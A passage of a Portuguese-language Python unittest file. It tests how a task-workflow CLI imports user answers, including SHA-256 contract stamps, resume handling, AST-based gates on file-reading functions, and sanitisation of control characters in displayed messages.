        saida = self._reprova(arquivo, self.pasta)
        self.assertIn("q-inventada", saida)
        self.assertIn("não é da rodada 1", saida,
                      "a recusa precisa vir do gate da rodada, não de um acidente do schema")

    def test_anotacao_orfa_e_preservada_byte_a_byte(self):
        dado = self._dado("decisao-direcoes.json")
        orfas = [a for a in dado["anotacoes"] if a["ancora_status"] == "orfa"]
        self.assertTrue(orfas, "o exemplo precisa ter anotação órfã")
        arquivo = self.raiz / "com-orfa.json"
        # De propósito numa forma que qualquer re-serialização do motor destruiria:
        # indentação de 4, chaves em ordem alfabética, acentos escapados, quebra no fim.
        # Sem isso o teste passaria mesmo se o motor reescrevesse o arquivo.
        bytes_originais = (json.dumps(dado, ensure_ascii=True, indent=4, sort_keys=True)
                           + "\n").encode("utf-8")
        arquivo.write_bytes(bytes_originais)
        self.assertIn(b"\\u00e3", bytes_originais, "a fixture precisa ter acento escapado")
        destino = importar_resposta(arquivo, self.pasta)
        self.assertEqual(destino.read_bytes(), bytes_originais,
                         "a devolução do usuário foi reescrita em vez de guardada")
        guardado = json.loads(destino.read_text(encoding="utf-8"))
        self.assertEqual([a["id"] for a in guardado["anotacoes"]],
                         [a["id"] for a in dado["anotacoes"]])

    def test_ancora_por_offset_nunca_e_causa_de_recusa(self):
        # Global Constraint: inicio/fim/prefixo são dica; o trecho é a autoridade
        dado = self._dado("decisao-direcoes.json")
        for anotacao in dado["anotacoes"]:
            anotacao["inicio"], anotacao["fim"] = 999999, 999999
            anotacao["prefixo"] = "prefixo que não existe mais no documento"
        arquivo = self.raiz / "offsets.json"
        arquivo.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
        destino = importar_resposta(arquivo, self.pasta)
        self.assertTrue(destino.exists())
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "direcao-escolhida")

    def test_falha_do_sistema_ao_gravar_vira_recado_em_portugues(self):
        export = self._export("decisao-direcoes.json")
        # errno conhecido: frase inteira em português, sem o texto do sistema (decisão 18)
        with mock.patch.object(Path, "write_bytes",
                               side_effect=OSError(errno.EACCES, "Permission denied")):
            saida = self._reprova(export, self.pasta)
        self.assertIn("não consegui guardar a resposta", saida)
        self.assertIn("sem permissão para escrever", saida)
        self.assertNotIn("Permission denied", saida)
        self.assertEqual(achar_ingles(prosa_sem_detalhe_tecnico(sem_citacoes(saida))), [])
        # errno sem tradução: via híbrida — o recado é nosso, o detalhe vem sob rótulo
        with mock.patch.object(Path, "write_bytes",
                               side_effect=OSError(9999, "Nonsense failure")):
            hibrida = self._reprova(export, self.pasta)
        self.assertIn("não consegui guardar a resposta", hibrida)
        self.assertIn(ROTULO_SISTEMA, hibrida)

    def test_contrato_que_nao_e_resposta_e_recusado(self):
        export = self._export("objetivo.json")
        saida = self._reprova(export, self.pasta)
        self.assertIn("objetivo-v1", saida)

    def test_cli_importa_e_resolve_a_tarefa(self):
        parser = construir_parser()
        args = parser.parse_args(["importar-resposta", "x.json"])
        self.assertIs(args.func, cmd_importar_resposta)
        export = self._export("decisao-direcoes.json")
        saida = io.StringIO()
        with contextlib.redirect_stdout(saida):
            main(["importar-resposta", str(export), "--tarefa", str(self.pasta)])
        self.assertIn("decisao-direcoes.json", saida.getvalue())
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "direcao-escolhida")

class TestCarimboDoContrato(TestImportar):
    """Decisão 20 (2026-08-21), opção 1: a resposta carrega a impressão digital
    do formulário que foi respondido.

    Sem o carimbo, um contrato editado depois da importação continuava passando desde que
    os identificadores não mudassem — a resposta era reinterpretada como aprovação de algo
    que o usuário nunca viu. Os identificadores dizem *sobre o quê* a pessoa respondeu; o
    carimbo diz *qual versão* ela leu."""

    def _abre_rodada(self, rodada=1):
        return self._grava(f"contratos/04-grill-rodada-{rodada}.json", "grill-rodada.json",
                           {"rodada": rodada})

    # ————— o campo existe, é exigido e sai das duas páginas —————

    def test_os_dois_schemas_exigem_o_carimbo(self):
        for versao in ("decisao-direcoes-v1", "grill-respostas-v1"):
            definicao = carregar_schema(versao)
            self.assertIn("contrato_sha256", definicao["required"],
                          f"{versao}: o carimbo não é obrigatório")
            forma = definicao["properties"]["contrato_sha256"]
            self.assertEqual(forma.get("pattern"), r"^[0-9a-f]{64}$",
                             f"{versao}: o carimbo aceita coisa que não é um SHA-256")

    def test_as_duas_paginas_emitem_o_carimbo_do_proprio_contrato(self):
        for exemplo, render in (("direcoes.json", render_direcoes),
                                ("grill-rodada.json", render_grill)):
            contrato = json.loads((PASTA_DE_EXEMPLOS / "validos" / exemplo)
                                  .read_text(encoding="utf-8"))
            pagina = render(contrato)
            esperado = sha_do_contrato(contrato)
            self.assertIn(f'"{esperado}"', pagina, f"{exemplo}: o sha não chegou à página")
            script = max(re.findall(r"<script>(.*?)</script>", pagina, re.S), key=len)
            construtor = script[script.index("function build"):][:1200]
            self.assertIn("contrato_sha256", construtor,
                          f"{exemplo}: o export sai sem o carimbo")

    # ————— presente e certo passa —————

    def test_carimbo_correto_e_aceito_nas_direcoes(self):
        destino = importar_resposta(self._export("decisao-direcoes.json"), self.pasta)
        self.assertTrue(destino.exists())
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "direcao-escolhida")

    def test_carimbo_correto_e_aceito_no_grill(self):
        self._abre_rodada()
        destino = importar_resposta(self._export("grill-respostas.json", {"rodada": 1}),
                                    self.pasta)
        self.assertEqual(destino.name, "grill-rodada-1.json")

    # ————— divergente bloqueia, nos dois momentos —————

    def _sha_de_mentira(self):
        return "f" * 64

    def test_carimbo_divergente_bloqueia_direcoes(self):
        export = self._export("decisao-direcoes.json",
                              {"contrato_sha256": self._sha_de_mentira()})
        saida = self._reprova(export, self.pasta)
        self.assertIn("mudou depois", saida)
        self.assertEqual(achar_ingles(prosa_sem_detalhe_tecnico(sem_citacoes(saida))), [],
                         saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    def test_carimbo_divergente_bloqueia_grill(self):
        self._abre_rodada()
        export = self._export("grill-respostas.json",
                              {"rodada": 1, "contrato_sha256": self._sha_de_mentira()})
        saida = self._reprova(export, self.pasta)
        self.assertIn("mudou depois", saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    def test_contrato_editado_depois_da_importacao_e_pego_na_releitura(self):
        """O cenário que motivou a decisão: IDs iguais, significado trocado.

        Sem carimbo isso passava — era o achado 1 da revisão final da Task 7."""
        self._abre_rodada(1)
        importar_resposta(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        contrato = self.pasta / "contratos" / "04-grill-rodada-1.json"
        corpo = json.loads(contrato.read_text(encoding="utf-8"))
        corpo["perguntas"][0]["pergunta"] = "Uma pergunta completamente diferente?"
        contrato.write_text(json.dumps(corpo, ensure_ascii=False), encoding="utf-8")
        self._abre_rodada(2)
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 2},
                                           nome="r2.json"), self.pasta)
        self.assertIn("grill-rodada-1.json", saida)
        self.assertIn("mudou depois", saida)
        self.assertFalse((self.pasta / "respostas" / "grill-rodada-2.json").exists())

    # ————— a retomada não é porta dos fundos (achado 1 da revisão da decisão 20) —————

    def _registro_cru(self):
        """Lê `tarefa.json` sem passar pela conferência da pasta.

        Depois que uma resposta guardada diverge, a pasta inteira bloqueia — que é o
        ponto. Para INSPECIONAR o estado nesses casos o teste lê o arquivo direto."""
        return json.loads((self.pasta / "tarefa.json").read_text(encoding="utf-8"))

    def _falhar_no_registro(self, export, pasta=None):
        """Deixa a importação exatamente no estado retomável: bytes gravados, registro não.

        É o cenário que o próprio motor manda repetir — e por isso não pode ser o cenário
        em que ele deixa de conferir."""
        def sem_espaco(*_):
            raise OSError(errno.ENOSPC, "No space left on device")

        with mock.patch(f"{__name__}.gravar_tarefa", side_effect=sem_espaco):
            self._reprova(export, pasta or self.pasta)

    def test_retomada_reconfere_o_carimbo_nas_direcoes(self):
        export = self._export("decisao-direcoes.json")
        self._falhar_no_registro(export)
        destino = self.pasta / "respostas" / "decisao-direcoes.json"
        self.assertTrue(destino.exists(), "a gravação parcial não aconteceu")
        # o contrato muda ENTRE a gravação parcial e a retomada
        contrato = self.pasta / "contratos" / "03-direcoes.json"
        corpo = json.loads(contrato.read_text(encoding="utf-8"))
        corpo["pergunta_original"] += "!"
        contrato.write_text(json.dumps(corpo, ensure_ascii=False), encoding="utf-8")
        saida = self._reprova(export, self.pasta)
        self.assertIn("mudou depois", saida)
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "pesquisa-concluida",
                         "a retomada incorporou uma resposta que já não corresponde")

    def test_retomada_reconfere_o_carimbo_no_grill(self):
        self._abre_rodada()
        registro = carregar_tarefa(self.pasta)
        registro["rodada_de_grill_pendente"] = 1   # sem isso não há registro a atualizar
        gravar_tarefa(self.pasta, registro)
        export = self._export("grill-respostas.json", {"rodada": 1})
        self._falhar_no_registro(export)
        destino = self.pasta / "respostas" / "grill-rodada-1.json"
        self.assertTrue(destino.exists(), "a gravação parcial não aconteceu")
        contrato = self.pasta / "contratos" / "04-grill-rodada-1.json"
        corpo = json.loads(contrato.read_text(encoding="utf-8"))
        corpo["perguntas"][0]["pergunta"] += "!"
        contrato.write_text(json.dumps(corpo, ensure_ascii=False), encoding="utf-8")
        saida = self._reprova(export, self.pasta)
        self.assertIn("mudou depois", saida)
        self.assertIsNotNone(self._registro_cru().get("rodada_de_grill_pendente"),
                             "a retomada limpou a rodada com resposta já divergente")

    def test_retomada_legitima_continua_concluindo(self):
        """O contrapeso: sem mudança no contrato, retomar tem de funcionar — nos dois."""
        export = self._export("decisao-direcoes.json")
        self._falhar_no_registro(export)
        destino = self.pasta / "respostas" / "decisao-direcoes.json"
        self.assertEqual(importar_resposta(export, self.pasta), destino)
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "direcao-escolhida")
        self.assertEqual(destino.read_bytes(), export.read_bytes(), "os bytes mudaram")

    def test_retomada_legitima_continua_concluindo_no_grill(self):
        self._abre_rodada()
        registro = carregar_tarefa(self.pasta)
        registro["rodada_de_grill_pendente"] = 1
        gravar_tarefa(self.pasta, registro)
        export = self._export("grill-respostas.json", {"rodada": 1})
        self._falhar_no_registro(export)
        destino = self.pasta / "respostas" / "grill-rodada-1.json"
        self.assertEqual(importar_resposta(export, self.pasta), destino)
        self.assertIsNone(carregar_tarefa(self.pasta).get("rodada_de_grill_pendente"),
                          "a retomada legítima não concluiu o registro")

    def test_retomada_reconfere_tambem_a_escolha_e_nao_so_o_carimbo(self):
        """A régua da retomada é a MESMA da importação, não um gate solto do carimbo."""
        self._abre_rodada()
        registro = carregar_tarefa(self.pasta)
        registro["rodada_de_grill_pendente"] = 1
        gravar_tarefa(self.pasta, registro)
        export = self._export("grill-respostas.json", {"rodada": 1})
        self._falhar_no_registro(export)
        contrato = self.pasta / "contratos" / "04-grill-rodada-1.json"
        corpo = json.loads(contrato.read_text(encoding="utf-8"))
        corpo["perguntas"][0]["id"] = "q-renomeada-depois"
        contrato.write_text(json.dumps(corpo, ensure_ascii=False), encoding="utf-8")
        saida = self._reprova(export, self.pasta)
        self.assertTrue("mudou depois" in saida or "q-renomeada-depois" in saida, saida)
        self.assertIsNotNone(self._registro_cru().get("rodada_de_grill_pendente"))

    def test_os_goldens_de_carimbo_divergente_sao_recusados(self):
        """Golden que materializa a regra: passa no validador, cai na importação.

        A revisão apontou que os inválidos existentes carregavam carimbo CORRETO — eram
        inválidos por outro motivo —, então a matriz de goldens não demonstrava esta regra
        isoladamente."""
        pasta = PASTA_DE_EXEMPLOS / "recusados-na-importacao"
        casos = sorted(pasta.glob("*.json"))
        self.assertEqual([c.name for c in casos],
                         ["decisao-direcoes-carimbo.json", "grill-respostas-carimbo.json"])
        self._abre_rodada()
        for caminho in casos:
            with self.subTest(caminho.name):
                dado = json.loads(caminho.read_text(encoding="utf-8"))
                # a forma passa: quem recusa é a relação com o contrato, não o schema
                self.assertEqual(validar_contra_schema(
                    dado, carregar_schema(dado["schema_version"])), [],
                    f"{caminho.name} deveria ser bem formado")
                dado["tarefa_id"] = self.pasta.name
                alvo = self.raiz / caminho.name
                alvo.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
                saida = self._reprova(alvo, self.pasta)
                self.assertIn("mudou depois", saida)

    # ————— todo leitor de resposta confere (achado 1 da r2) —————

    def _decisao_divergente_no_disco(self):
        """Põe direto em `respostas/` uma decisão boa, só com o carimbo de outra versão."""
        dado = self._dado("decisao-direcoes.json")
        dado["contrato_sha256"] = "0" * 63 + "1"
        alvo = self.pasta / "respostas" / "decisao-direcoes.json"
        alvo.parent.mkdir(parents=True, exist_ok=True)
        alvo.write_text(json.dumps(dado, ensure_ascii=False, indent=2), encoding="utf-8")
        return alvo

    def test_concluir_etapa_nao_avanca_com_carimbo_divergente(self):
        """Segunda porta pública: `concluir-etapa` incorporava a resposta sem conferir."""
        self._decisao_divergente_no_disco()
        saida = io.StringIO()
        with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit) as ctx:
            main(["concluir-etapa", str(self.pasta), "direcao-escolhida",
                  "--data", self.DATA])
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("mudou depois", saida.getvalue())
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "pesquisa-concluida",
                         "a etapa avançou com uma decisão que não corresponde ao relatório")

    def test_status_nao_diz_pronto_com_carimbo_divergente(self):
        self._decisao_divergente_no_disco()
        satisfeito, motivo = avaliar_gate(self.pasta, "direcao-escolhida",
                                          carregar_tarefa(self.pasta))
        self.assertFalse(satisfeito, "o status disse que estava pronto para concluir")
        self.assertIn("mudou depois", motivo or "")

    def test_releitura_da_jornada_pega_contrato_alterado_depois(self):
        """Decisão já incorporada + contrato alterado = a pasta deixa de se sustentar."""
        importar_resposta(self._export("decisao-direcoes.json"), self.pasta)
        contrato = self.pasta / "contratos" / "03-direcoes.json"
        corpo = json.loads(contrato.read_text(encoding="utf-8"))
        corpo["pergunta_original"] += "!"
        contrato.write_text(json.dumps(corpo, ensure_ascii=False), encoding="utf-8")
        saida = io.StringIO()
        with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit):
            carregar_tarefa(self.pasta)
        self.assertIn("mudou depois", saida.getvalue())

    def test_so_a_allowlist_toca_as_primitivas_de_leitura(self):
        """Gate estrutural: o leitor novo não consegue nem LER, quanto mais escapar.

        A versão anterior era lexical — procurava a palavra `respostas` no texto da função
        e aceitava um comentário como prova de conferência. O revisor furou com seis
        leitores sintéticos: pasta montada por `"res" + "postas"`, `Path.read_text`,
        `open`, `os.scandir`, um helper indireto e um comentário mentiroso.

        A régua agora é outra: nenhuma função fora desta lista pode usar as primitivas de
        leitura ou de enumeração. Caminho dinâmico deixa de importar, porque para ler
        qualquer coisa é preciso passar por uma primitiva — e elas estão trancadas."""
        portadores = self._portadores_de_primitiva(ler_fonte_do_motor())
        estranhos = sorted(set(portadores) - set(PORTADORES_DE_LEITURA))
        self.assertEqual(estranhos, [],
                         "função nova mexendo em arquivo por conta própria: "
                         + ", ".join(estranhos)
                         + " — se a leitura é legítima, entre em PORTADORES_DE_LEITURA "
                           "de propósito, para a revisão ver")
        sumidos = sorted(set(PORTADORES_DE_LEITURA) - set(portadores))
        self.assertEqual(sumidos, [], f"PORTADORES_DE_LEITURA cita quem não lê mais: {sumidos}")

    @staticmethod
    def _portadores_de_primitiva(fonte):
        """Nome de cada função que chama, ela mesma, uma primitiva de leitura."""
        achados = []
        for funcao in [n for n in ast.walk(ast.parse(fonte))
                       if isinstance(n, ast.FunctionDef)]:
            for no in ast.walk(funcao):
                if not isinstance(no, ast.Call):
                    continue
                nome = (no.func.id if isinstance(no.func, ast.Name)
                        else no.func.attr if isinstance(no.func, ast.Attribute) else None)
                if nome in PRIMITIVAS_DE_LEITURA:
                    achados.append(funcao.name)
                    break
        return achados

    def test_todo_leitor_de_resposta_chama_a_regua_de_verdade(self):
        """`ast.Call` real — comentário e string não provam nada (r3/achado 2)."""
        arvore = ast.parse(ler_fonte_do_motor())
        por_nome = {n.name: n for n in ast.walk(arvore) if isinstance(n, ast.FunctionDef)}
        reguas = ("carregar_resposta_guardada", "_conferir_resposta_contra_origem",
                  "_conferir_respostas_do_grill", "_conferir_carimbo",
                  "conferir_respostas_de_grill_guardadas")
        for leitor in LEITORES_DE_RESPOSTA:
            with self.subTest(leitor):
                self.assertIn(leitor, por_nome, f"{leitor} sumiu do motor")
                chama = any(isinstance(no, ast.Call) and isinstance(no.func, ast.Name)
                            and no.func.id in reguas
                            for no in ast.walk(por_nome[leitor]))
                self.assertTrue(chama, f"{leitor} lê resposta sem chamar régua nenhuma")

    def test_os_escapes_do_revisor_sao_detectados(self):
        """Sabotagens negativas congeladas: os seis escapes da r3, mais o glob."""
        base = ler_fonte_do_motor()
        escapes = {
            "concatenacao_dinamica":
                'def esquecido(pasta):\n'
                '    return carregar_e_validar(pasta / ("res" + "postas") / "x.json")\n',
            "path_read_text":
                'def esquecido(pasta):\n'
                '    return (pasta / "respostas" / "x.json").read_text()\n',
            "builtin_open":
                'def esquecido(pasta):\n'
                '    return open(str(pasta) + "/respostas/x.json").read()\n',
            "os_scandir":
                'def esquecido(pasta):\n    return list(os.scandir(pasta / "respostas"))\n',
            "helper_indireto":
                'def esquecido(pasta):\n'
                '    return ler_json(pasta / "respostas" / "x.json")\n',
            "comentario_mentiroso":
                'def esquecido(pasta):\n    # carregar_resposta_guardada\n'
                '    return carregar_e_validar(pasta / "respostas" / "x.json")\n',
            "glob_das_respostas":
                'def esquecido(pasta):\n'
                '    return sorted((pasta / "respostas").glob("*.json"))\n',
        }
        for rotulo, corpo in escapes.items():
            with self.subTest(rotulo):
                portadores = self._portadores_de_primitiva(base + "\n" + corpo)
                self.assertIn("esquecido", portadores,
                              f"o escape '{rotulo}' passou pelo gate")

    def test_a_isencao_da_funcao_inteira_acabou(self):
        """`importar_resposta` deixou de ser isenta: entra nas duas listas e é conferida
        como qualquer outro leitor (r3/achado 2, item 1)."""
        self.assertIn("importar_resposta", PORTADORES_DE_LEITURA)
        self.assertIn("importar_resposta", LEITORES_DE_RESPOSTA)


    # ————— achado 1 da r3: a resposta de grill JÁ incorporada também é relida —————

    def _grill_incorporado(self):
        """Rodada 1 aberta, respondida e já registrada — o estado normal depois do uso."""
        self._abre_rodada(1)
        registro = carregar_tarefa(self.pasta)
        registro["rodada_de_grill_pendente"] = 1
        gravar_tarefa(self.pasta, registro)
        export = self._export("grill-respostas.json", {"rodada": 1})
        importar_resposta(export, self.pasta)
        return export

    def _alterar_pergunta_da_rodada(self, rodada=1):
        contrato = self.pasta / "contratos" / f"04-grill-rodada-{rodada}.json"
        corpo = json.loads(contrato.read_text(encoding="utf-8"))
        corpo["perguntas"][0]["pergunta"] += "!"
        contrato.write_text(json.dumps(corpo, ensure_ascii=False), encoding="utf-8")

    def test_status_bloqueia_com_pergunta_do_grill_alterada(self):
        self._grill_incorporado()
        self._alterar_pergunta_da_rodada()
        saida = io.StringIO()
        with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit) as ctx:
            main(["status", str(self.pasta)])
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("mudou depois", saida.getvalue())

    def test_reimportar_identico_apos_mudanca_diz_mudou_depois(self):
        """O early return de 'já foi importada' lia os bytes antes de conferir."""
        export = self._grill_incorporado()
        self._alterar_pergunta_da_rodada()
        saida = self._reprova(export, self.pasta)
        self.assertIn("mudou depois", saida)
        self.assertNotIn("já foi importada", saida,
                         "respondeu 'já importada' sem provar que continua correspondente")

    def test_concluir_grill_bloqueia_com_pergunta_alterada(self):
        self._grill_incorporado()
        self._grava("contratos/04-grill-consolidado.json", "grill-consolidado.json")
        antes = carregar_tarefa(self.pasta)["etapa"]     # lido antes de a pasta divergir
        self._alterar_pergunta_da_rodada()
        saida = io.StringIO()
        with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit) as ctx:
            main(["concluir-etapa", str(self.pasta), "grill-concluido", "--data", self.DATA])
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("mudou depois", saida.getvalue())
        registro = json.loads((self.pasta / "tarefa.json").read_text(encoding="utf-8"))
        self.assertEqual(registro["etapa"], antes, "a etapa avançou mesmo assim")

    def test_grill_intacto_continua_passando(self):
        """Contrapeso: sem alteração, a pasta com grill incorporado segue íntegra."""
        self._grill_incorporado()
        # o grill não fecha etapa (quem fecha é o consolidado); o que se cobra aqui é que
        # a pasta continua legível e o status sai sem bloquear
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "pesquisa-concluida")
        self.assertIn("Tarefa:", resumo_da_tarefa(self.pasta))

    def test_recado_do_carimbo_e_leigo_e_diz_o_que_fazer(self):
        export = self._export("decisao-direcoes.json",
                              {"contrato_sha256": self._sha_de_mentira()})
        saida = self._reprova(export, self.pasta)
        for tecniques in ("sha", "hash", "checksum"):
            self.assertNotIn(tecniques, saida.split(ROTULO_RASTRO)[0].lower(),
                             f"jargão '{tecniques}' na linha que o usuário lê")
        self.assertIn("ere a página de novo", saida)


class TestImportarR3Hibrido(TestImportar):
    """Task 7 r3, fechamento híbrido: receitas do parecer aplicadas ao pé da letra."""

    def _abre_rodada(self, rodada=1, nome=None):
        alvo = self.pasta / "contratos" / (nome or f"04-grill-rodada-{rodada}.json")
        alvo.parent.mkdir(parents=True, exist_ok=True)
        alvo.write_text(json.dumps(self._dado("grill-rodada.json", {"rodada": rodada}),
                                   ensure_ascii=False), encoding="utf-8")
        return alvo

    # ————— achado 2: nome divergente não pode esconder uma rodada —————

    NOMES_DIVERGENTES = (
        ("maiúscula", "04-Grill-rodada-2.json"),
        ("espaço no começo", " 04-grill-rodada-2.json"),
        ("espaço no fim", "04-grill-rodada-2.json "),
        ("espaço antes da extensão", "04-grill-rodada-2 .json"),
        ("espaço interno", "04-grill- rodada-2.json"),
        ("zeros à esquerda", "04-grill-rodada-002.json"),
    )

    def test_nome_divergente_de_contrato_bloqueia_nomeando_o_arquivo(self):
        for rotulo, nome in self.NOMES_DIVERGENTES:
            with self.subTest(rotulo):
                pasta = criar_tarefa(self.raiz, f"Tarefa {rotulo}", self.DATA)
                for destino, exemplo in (("contratos/01-objetivo.json", "objetivo.json"),
                                         ("contratos/02-pesquisa.json", "pesquisa.json"),
                                         ("contratos/03-direcoes.json", "direcoes.json")):
                    alvo = pasta / destino
                    alvo.parent.mkdir(parents=True, exist_ok=True)
                    dado = json.loads((PASTA_DE_EXEMPLOS / "validos" / exemplo)
                                      .read_text(encoding="utf-8"))
                    dado["tarefa_id"] = pasta.name
                    alvo.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
                avancar_etapa(pasta, "objetivo-confirmado", data=self.DATA)
                avancar_etapa(pasta, "pesquisa-concluida", data=self.DATA)
                contratos = pasta / "contratos"
                erro_criacao = None
                for rodada, arquivo in ((1, "04-grill-rodada-1.json"), (2, nome)):
                    alvo = contratos / arquivo
                    dado = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                                      .read_text(encoding="utf-8"))
                    dado["tarefa_id"], dado["rodada"] = pasta.name, rodada
                    antes = {entrada.name for entrada in contratos.iterdir()}
                    try:
                        alvo.write_text(json.dumps(dado, ensure_ascii=False),
                                        encoding="utf-8")
                    except OSError as exc:
                        erro_criacao = exc
                    depois = {entrada.name for entrada in contratos.iterdir()}
                    novos, removidos = depois - antes, antes - depois

                canonico = "04-grill-rodada-2.json"
                if erro_criacao is not None and not novos and not removidos:
                    estado = "REJECTED"
                elif erro_criacao is None and novos == {nome} and not removidos:
                    estado = "PRESERVED"
                elif erro_criacao is None and novos == {canonico} and not removidos:
                    estado = "NORMALIZED"
                else:
                    self.fail(f"estado ambíguo ao criar {nome!r} ({rotulo}): "
                              f"erro={erro_criacao!r}, novos={sorted(novos)!r}, "
                              f"removidos={sorted(removidos)!r}")

                if estado != "REJECTED":
                    export = self.raiz / f"e-{abs(hash(nome))}.json"
                    dado = json.loads((PASTA_DE_EXEMPLOS / "validos" /
                                       "grill-respostas.json").read_text(encoding="utf-8"))
                    dado["tarefa_id"], dado["rodada"] = pasta.name, 1
                    export.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
                    saida = self._reprova(export, pasta)
                    if estado == "PRESERVED":
                        nome_real, = novos
                        self.assertEqual(nome_real, nome)
                        self.assertIn(nome_real, saida,
                                      f"a recusa não nomeia o arquivo divergente ({rotulo})")
                    else:
                        self.assertIn("mais de uma rodada", saida)
                        self.assertIn("(1, 2)", saida)
                self.assertEqual(sorted(p.name for p in (pasta / "respostas").glob("*")), [],
                                 f"gravou com uma rodada escondida ({rotulo})")

    def test_nome_divergente_de_resposta_bloqueia(self):
        self._abre_rodada(1)
        alheio = self.pasta / "respostas" / "grill-rodada-01 .json"
        alheio.parent.mkdir(parents=True, exist_ok=True)
        try:
            alheio.write_text(json.dumps(self._dado("grill-respostas.json", {"rodada": 1}),
                                         ensure_ascii=False), encoding="utf-8")
        except OSError:
            self.skipTest("o sistema de arquivos recusa o nome")
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        self.assertIn("grill-rodada-01", saida)

    def test_colisao_de_zeros_a_esquerda_bloqueia(self):
        """N2 do parecer: o alias `1`/`001` não pode depender do tamanho do nome."""
        self._abre_rodada(1)
        gemeo = self.pasta / "contratos" / "04-grill-rodada-001.json"
        gemeo.write_text(json.dumps(self._dado("grill-rodada.json", {"rodada": 1}),
                                    ensure_ascii=False), encoding="utf-8")
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        self.assertIn("04-grill-rodada-001.json", saida)
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [])

    # ————— achado 4: a régua tem de ser mesmo a mesma (N1) —————

    def test_resposta_guardada_pendente_bloqueia_a_rodada_seguinte(self):
        self._abre_rodada(1)
        guardada = self.pasta / "respostas" / "grill-rodada-1.json"
        guardada.parent.mkdir(parents=True, exist_ok=True)
        dado = self._dado("grill-respostas.json", {"rodada": 1})
        dado["respostas"][0].update({"estado": "pendente", "escolha_id": None})
        guardada.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
        self._abre_rodada(2)
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 2},
                                           nome="r2.json"), self.pasta)
        self.assertIn("grill-rodada-1.json", saida)
        self.assertIn("ainda sem resposta", saida)
        self.assertFalse((self.pasta / "respostas" / "grill-rodada-2.json").exists())

    def test_a_regua_e_chamada_de_fato_nas_duas_funcoes(self):
        """AST, não texto: comentário ou string com o nome não satisfazem mais o oráculo."""
        fonte = Path(__file__).read_text(encoding="utf-8")
        arvore = ast.parse(fonte)
        por_nome = {no.name: no for no in ast.walk(arvore)
                    if isinstance(no, ast.FunctionDef)}
        for funcao, regua in (("conferir_respostas_de_grill_guardadas",
                               "_conferir_respostas_do_grill"),
                              ("_conferir_resposta_contra_origem",
                               "_conferir_respostas_do_grill")):
            chamadas = [no for no in ast.walk(por_nome[funcao])
                        if isinstance(no, ast.Call) and isinstance(no.func, ast.Name)
                        and no.func.id == regua]
            self.assertEqual(len(chamadas), 1,
                             f"{funcao}: esperava exatamente uma chamada direta à régua, "
                             f"achei {len(chamadas)}")
        # Os DOIS ramos passam pela porta — e a prova associa UMA chamada a CADA ramo.
        # Contar o total aceitava zero na retomada e duas no ramo normal (r2/achado 3).
        porta = "_conferir_resposta_contra_origem"

        def chama_a_porta(corpo):
            return any(isinstance(no, ast.Call) and isinstance(no.func, ast.Name)
                       and no.func.id == porta
                       for trecho in corpo for no in ast.walk(trecho))

        condicionais = [no for no in ast.walk(por_nome["importar_resposta"])
                        if isinstance(no, ast.If) and isinstance(no.test, ast.Name)
                        and no.test.id == "retomada"]
        self.assertEqual(len(condicionais), 1,
                         "esperava um único `if retomada:` em importar_resposta")
        ramo = condicionais[0]
        self.assertTrue(chama_a_porta(ramo.body),
                        "o ramo de RETOMADA não confere a resposta contra o contrato")
        self.assertTrue(chama_a_porta(ramo.orelse),
                        "o ramo NORMAL não confere a resposta contra o contrato")

    # ————— achado 3: o funil de eco cobre todos os produtores —————

    HOSTIL = "a\"\n\x1b[31m​‮ z"

    @staticmethod
    def _crus(texto):
        return [c for c in texto if c not in (" ", "\n")
                and unicodedata.category(c) in ("Cc", "Cf", "Zl", "Zp", "Zs")]

    def test_resumo_da_tarefa_nao_ecoa_controles(self):
        registro = carregar_tarefa(self.pasta)
        registro["objetivo_resumido"] = self.HOSTIL
        gravar_tarefa(self.pasta, registro)
        self.assertEqual(self._crus(resumo_da_tarefa(self.pasta)), [])

    def test_resolver_tarefa_nao_ecoa_controles(self):
        raiz = Path(self._temp.name) / ("r" + self.HOSTIL.replace("\n", ""))
        try:
            raiz.mkdir()
        except OSError:
            self.skipTest("o sistema de arquivos recusa o nome hostil")
        saida = io.StringIO()
        with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit):
            resolver_tarefa(None, str(raiz))
        self.assertEqual(self._crus(saida.getvalue()), [], repr(saida.getvalue()))

    def test_gate_de_eco_usa_ast_e_pega_alias(self):
        """O gate textual caía com `{str(arquivo)}`; o de AST tem de pegar."""
        problemas = ecos_crus_no_motor("""
def exemplo(arquivo):
    fail(f"olha o {str(arquivo)} aqui")
""")
        self.assertNotEqual(problemas, [], "o gate não pegou o alias `str(...)`")
        self.assertEqual(ecos_crus_no_motor("""
def exemplo(arquivo):
    fail(f"olha o {citar(arquivo)} aqui")
"""), [])

    def test_o_motor_nao_tem_eco_cru(self):
        self.assertEqual(ecos_crus_no_motor(), [])


_AUSENTE = object()      # sentinela: distingue "removi" de "já não estava lá"

class TestPosAuditoria(unittest.TestCase):
    """Rodada pós-auditoria: defeitos residuais que todas as rodadas deixaram passar.

